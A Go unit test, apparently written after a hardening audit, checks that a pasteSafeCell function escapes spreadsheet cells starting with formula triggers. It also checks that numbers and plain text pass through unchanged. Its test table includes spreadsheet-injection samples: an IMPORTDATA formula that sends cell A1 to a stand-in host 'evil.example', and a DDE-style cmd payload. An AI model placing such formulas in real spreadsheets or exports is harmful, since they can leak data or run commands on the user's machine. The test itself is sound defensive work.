package main

import "testing"

// The hardening audit, 17 November 2026: rows read off a web page and pasted
// "as cells" were whatever they were, and a sheet works out a cell that
// begins with "=". "=IMPORTDATA(…)" sends what is in the sheet out.
func TestCellsThatASheetWouldWorkOutArePastedAsWords(t *testing.T) {
	for cell, want := range map[string]string{
		`=IMPORTDATA("https://evil.example/?q="&A1)`: `'=IMPORTDATA("https://evil.example/?q="&A1)`,
		"=1+1":                    "'=1+1",
		"@SUM(A1:A9)":             "'@SUM(A1:A9)",
		"+cmd|' /C calc'!A0":      "'+cmd|' /C calc'!A0",
		"-2+3":                    "'-2+3",
		"+39 333 1234567 call me": "'+39 333 1234567 call me",
		// A blank before the sign does not hide it: a table handed over as
		// HTML loses the blank.
		" =1+1":       "' =1+1",
		"\t=1+1":      "'\t=1+1",
		"\u00a0=1+1":  "'\u00a0=1+1",
		"\u200b=1+1":  "'\u200b=1+1",
		"\uff1d1+1":   "'\uff1d1+1",
		"\u22121+cmd": "'\u22121+cmd",
		// Numbers stay numbers, with their sign.
		"-12.5":    "-12.5",
		"+3":       "+3",
		"1,200.00": "1,200.00",
		"-45 %":    "-45 %",
		" -7 ":     " -7 ",
		// And ordinary words are as they are.
		"Sam":           "Sam",
		"a = b":         "a = b",
		"":              "",
		"Q4 - forecast": "Q4 - forecast",
	} {
		if got := pasteSafeCell(cell); got != want {
			t.Errorf("pasteSafeCell(%q) = %q, want %q", cell, got, want)
		}
	}
}
